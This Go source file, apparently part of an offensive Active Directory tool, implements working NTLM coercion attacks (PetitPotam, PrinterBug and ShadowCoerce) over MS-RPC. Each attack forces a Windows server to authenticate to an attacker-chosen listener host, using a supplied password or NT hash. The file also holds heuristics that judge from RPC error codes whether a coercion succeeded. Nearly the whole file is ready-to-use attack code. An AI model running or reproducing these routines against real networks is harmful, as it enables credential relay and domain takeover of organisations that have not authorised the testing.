package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	efsrpc "github.com/oiweiwei/go-msrpc/msrpc/efsr/efsrpc/v1"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	fsrvp "github.com/oiweiwei/go-msrpc/msrpc/fsrvp/fileservervssagent/v1"
	winspool "github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

type coerceSubprocessParams struct {
	Listener string `json:"listener"`
	Method   string `json:"method"`
}

type coerceSubprocessResult struct {
	Method  string `json:"method"`
	Success bool   `json:"success"`
	Message string `json:"message"`
}

func rpcHelperCoerce(req rpcHelperRequest) (json.RawMessage, error) {
	var p coerceSubprocessParams
	if err := json.Unmarshal(req.Params, &p); err != nil {
		return nil, fmt.Errorf("invalid coerce params: %v", err)
	}

	credUser := req.Username
	if req.Domain != "" {
		credUser = req.Domain + `\` + req.Username
	}
	var cred sspcred.Credential
	if req.Hash != "" {
		cred = sspcred.NewFromNTHash(credUser, stripLMPrefix(req.Hash))
	} else if req.Password != "" {
		cred = sspcred.NewFromPassword(credUser, req.Password)
	} else {
		return nil, fmt.Errorf("either password or hash required")
	}

	var result coerceSubprocessResult
	switch p.Method {
	case "petitpotam":
		result = coerceSubPetitPotam(req.Server, p.Listener, cred, req.Timeout)
	case "printerbug":
		result = coerceSubPrinterBug(req.Server, p.Listener, cred, req.Timeout)
	case "shadowcoerce":
		result = coerceSubShadowCoerce(req.Server, p.Listener, cred, req.Timeout)
	default:
		return nil, fmt.Errorf("unknown coerce method: %s", p.Method)
	}

	out, _ := json.Marshal(result)
	return out, nil
}

func coerceSubPetitPotam(server, listener string, cred sspcred.Credential, timeout int) coerceSubprocessResult {
	coercePath := fmt.Sprintf(`\\%s\share\file.txt`, listener)
	pipes := []string{"efsrpc", "lsarpc"}
	var lastErr error

	for _, pipe := range pipes {
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)

		endpoint := fmt.Sprintf("ncacn_np:[%s]", pipe)
		cc, err := dcerpc.Dial(ctx, server,
			dcerpc.WithEndpoint(endpoint),
			dcerpc.WithCredentials(cred),
			dcerpc.WithMechanism(ssp.SPNEGO),
			dcerpc.WithMechanism(ssp.NTLM),
		)
		if err != nil {
			lastErr = fmt.Errorf("pipe %s: %w", pipe, err)
			cancel()
			continue
		}

		cli, err := efsrpc.NewEfsrpcClient(ctx, cc, dcerpc.WithSeal())
		if err != nil {
			lastErr = fmt.Errorf("pipe %s bind: %w", pipe, err)
			cc.Close(ctx)
			cancel()
			continue
		}

		_, err = cli.OpenFileRaw(ctx, &efsrpc.OpenFileRawRequest{
			FileName: coercePath,
			Flags:    0,
		})

		cc.Close(ctx)
		cancel()

		if err == nil || coerceIsRPCProcessed(err) {
			msg := fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s)", server, pipe, coercePath)
			if err != nil {
				msg += fmt.Sprintf(" [response: %v]", err)
			}
			return coerceSubprocessResult{Method: "PetitPotam (MS-EFSR)", Success: true, Message: msg}
		}

		lastErr = fmt.Errorf("pipe %s: %w", pipe, err)
	}

	return coerceSubprocessResult{Method: "PetitPotam (MS-EFSR)", Success: false,
		Message: fmt.Sprintf("all pipes failed: %v", lastErr)}
}

func coerceSubPrinterBug(server, listener string, cred sspcred.Credential, timeout int) coerceSubprocessResult {
	ctx, cancel := rpcSecurityContext(cred, time.Duration(timeout)*time.Second)
	defer cancel()

	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+server,
		epm.EndpointMapper(ctx,
			net.JoinHostPort(server, "135"),
			dcerpc.WithInsecure(),
		))
	if err != nil {
		return coerceSubprocessResult{Method: "PrinterBug (MS-RPRN)", Success: false,
			Message: fmt.Sprintf("connection failed: %v", err)}
	}
	defer cc.Close(ctx)

	cli, err := winspool.NewWinspoolClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
	if err != nil {
		return coerceSubprocessResult{Method: "PrinterBug (MS-RPRN)", Success: false,
			Message: fmt.Sprintf("winspool client failed: %v", err)}
	}

	printerName := fmt.Sprintf(`\\%s`, server)
	openResp, err := cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
		PrinterName:      printerName,
		DevModeContainer: &winspool.DevModeContainer{},
		AccessRequired:   0x00020008,
	})
	if err != nil {
		openResp, err = cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
			PrinterName:      printerName,
			DevModeContainer: &winspool.DevModeContainer{},
			AccessRequired:   0,
		})
		if err != nil {
			return coerceSubprocessResult{Method: "PrinterBug (MS-RPRN)", Success: false,
				Message: fmt.Sprintf("OpenPrinter failed: %v", err)}
		}
	}

	listenerHost := fmt.Sprintf(`\\%s`, listener)
	_, err = cli.RemoteFindFirstPrinterChangeNotification(ctx,
		&winspool.RemoteFindFirstPrinterChangeNotificationRequest{
			Printer:      openResp.Handle,
			Flags:        0x00000100,
			Options:      0,
			LocalMachine: listenerHost,
			PrinterLocal: 0,
		})

	if err == nil || coerceIsRPCProcessed(err) {
		msg := fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification (listener: %s)", listenerHost)
		if err != nil {
			msg += fmt.Sprintf(" [response: %v]", err)
		}
		return coerceSubprocessResult{Method: "PrinterBug (MS-RPRN)", Success: true, Message: msg}
	}

	return coerceSubprocessResult{Method: "PrinterBug (MS-RPRN)", Success: false,
		Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification failed: %v", err)}
}

func coerceSubShadowCoerce(server, listener string, cred sspcred.Credential, timeout int) coerceSubprocessResult {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cc, err := dcerpc.Dial(ctx, server,
		dcerpc.WithEndpoint("ncacn_np:[FssagentRpc]"),
		dcerpc.WithCredentials(cred),
		dcerpc.WithMechanism(ssp.SPNEGO),
		dcerpc.WithMechanism(ssp.NTLM),
	)
	if err != nil {
		return coerceSubprocessResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
			Message: fmt.Sprintf("connection to \\\\%s\\pipe\\FssagentRpc failed (service may not be running): %v", server, err)}
	}
	defer cc.Close(ctx)

	cli, err := fsrvp.NewFileServerVSSAgentClient(ctx, cc, dcerpc.WithSeal())
	if err != nil {
		return coerceSubprocessResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
			Message: fmt.Sprintf("FSRVP bind failed (service may not be running): %v", err)}
	}

	coercePath := fmt.Sprintf(`\\%s\share`, listener)
	_, err = cli.IsPathShadowCopied(ctx, &fsrvp.IsPathShadowCopiedRequest{
		ShareName: coercePath,
	})

	if err == nil || coerceIsRPCProcessed(err) {
		msg := fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s)", server, coercePath)
		if err != nil {
			msg += fmt.Sprintf(" [response: %v]", err)
		}
		return coerceSubprocessResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true, Message: msg}
	}

	return coerceSubprocessResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
		Message: fmt.Sprintf("IsPathShadowCopied failed: %v", err)}
}

// coerceIsRPCProcessed checks if an error indicates the RPC call was actually
// processed (coercion triggered) vs a transport/binding failure.
func coerceIsRPCProcessed(err error) bool {
	if err == nil {
		return true
	}
	errStr := err.Error()
	processedIndicators := []string{
		"ERROR_BAD_NETPATH",
		"ERROR_ACCESS_DENIED",
		"ERROR_BAD_NET_NAME",
		"ERROR_NOT_FOUND",
		"ERROR_INVALID_PARAMETER",
		"0x00000035",
		"0x00000005",
		"RPC_S_SERVER_UNAVAILABLE",
		"0x000006ba",
	}
	for _, indicator := range processedIndicators {
		if strings.Contains(errStr, indicator) {
			return true
		}
	}
	return false
}
